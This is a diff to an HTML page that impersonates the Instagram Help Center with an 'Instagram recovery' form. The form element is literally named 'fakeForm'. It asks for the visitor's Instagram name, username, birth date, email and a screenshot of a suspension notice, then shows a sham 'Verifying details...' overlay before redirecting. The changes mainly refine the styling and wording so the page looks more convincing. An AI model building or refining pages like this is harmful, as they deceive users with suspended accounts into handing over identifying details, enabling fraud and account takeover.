@@ -5,32 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Help Center</title>
     <style>
-        /* Instagram Theme Styles */
+        /* Instagram Theme Styles & Responsiveness */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #fafafa;
             margin: 0;
-            padding: 0;
+            padding: 20px; /* Mobile edge spacing */
             display: flex;
             justify-content: center;
-            align-items: flex-start;
+            align-items: center; /* Center vertically for desktop */
             min-height: 100vh;
+            box-sizing: border-box;
         }
         .contact-container {
             width: 100%;
             max-width: 400px;
-            margin-top: 40px;
-            padding: 30px 40px;
+            padding: 30px 25px;
             background-color: #ffffff;
             border: 1px solid #dbdbdb;
             border-radius: 4px;
             box-sizing: border-box;
-            position: relative; /* Floating effect ke liye jaroori hai */
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); /* Proper software feel on PC */
         }
         .top-logo {
             display: block;
             margin: 0 auto 20px auto;
-            width: 120px; /* Size pehle jaisa chhota kar diya */
+            width: 60px; /* Logo double chhota kar diya */
             height: auto;
         }
         .contact-container h2 {
@@ -79,18 +80,19 @@
             cursor: pointer;
             margin-top: 10px;
             font-size: 14px;
+            transition: background-color 0.2s;
         }
         .proceed-btn:hover {
             background-color: #1877f2;
         }
         .optional-text {
-            color: green; /* Color green kar diya */
+            color: green;
             font-size: 0.85em;
             margin-left: 5px;
             font-weight: normal;
         }
         
-        /* Upload Screenshot Ek Sath Lane Ke Liye */
+        /* Upload Screenshot Box */
         .screenshot-container {
             margin-bottom: 15px;
             padding: 10px;
@@ -140,7 +142,7 @@
             border-radius: 4px;
         }
         .blinking-logo {
-            width: 60px;
+            width: 50px;
             height: auto;
             animation: blinker 1s linear infinite;
         }
@@ -153,13 +155,19 @@
             color: #262626;
             font-weight: 600;
         }
+
+        /* Mobile specific adjustments */
+        @media (max-width: 480px) {
+            .contact-container {
+                padding: 25px 15px;
+            }
+        }
     </style>
 </head>
 <body>
 
 <div class="contact-container">
     
-    <!-- Floating Blur Effect Overlay -->
     <div id="loadingOverlay">
         <img src="inlogo.png" alt="Loading" class="blinking-logo">
         <div class="verifying-text">Verifying details...</div>
@@ -167,14 +175,12 @@
 
     <img src="inlogo.png" alt="Logo" class="top-logo" id="mainLogo">
     
-    <!-- Title Changed -->
     <h2 id="formTitle">Instagram recovery</h2>
     
     <form class="form-fields" id="fakeForm" onsubmit="validateAndRedirect(event)">
-        <!-- Name field with custom validation -->
-        <label for="name">Name</label>
-        <input type="text" id="name" placeholder="Full name" autocomplete="off" required 
-               oninvalid="this.setCustomValidity('please enter your full name')" 
+        <label for="name">Instagram Name</label>
+        <input type="text" id="name" placeholder="Your Instagram name" autocomplete="off" required 
+               oninvalid="this.setCustomValidity('please enter your Instagram name')" 
                oninput="this.setCustomValidity('')">
 
         <label for="username">Username</label>
@@ -182,7 +188,6 @@
                oninvalid="this.setCustomValidity('please enter your username')" 
                oninput="this.setCustomValidity('')">
 
-        <!-- DOB optional green -->
         <label for="dob">Date of Birth <span class="optional-text">(Optional)</span></label>
         <input type="date" id="dob" autocomplete="off">
 
@@ -197,14 +202,12 @@
             <option value="prefer_not_to_say">Prefer not to say</option>
         </select>
 
-        <!-- Contact Email is not required now -->
         <label for="contactEmail">Contact Email</label>
         <input type="email" id="contactEmail" placeholder="Your contact email" autocomplete="off">
 
-        <!-- Upload Screenshot in one block and not required -->
         <div class="screenshot-container">
             <label for="screenshot">Upload Screenshot</label>
-            <span class="screenshot-help">suspended or disabled upload screenshot</span>
+            <span class="screenshot-help">Upload a screenshot of the suspended or disabled message.</span>
             <input type="file" id="screenshot" accept="image/*">
         </div>
 
@@ -218,10 +221,9 @@
 
 <script>
     function validateAndRedirect(event) {
-        // Form submit hone se rokna
         event.preventDefault();
         
-        // Form ko hide nahi kar rahe, uske upar blur (bokeh) effect laga rahe hain
+        // Blur (bokeh) effect overlay dikhana
         document.getElementById('loadingOverlay').style.display = 'flex';
 
         // Redirect after 3 seconds
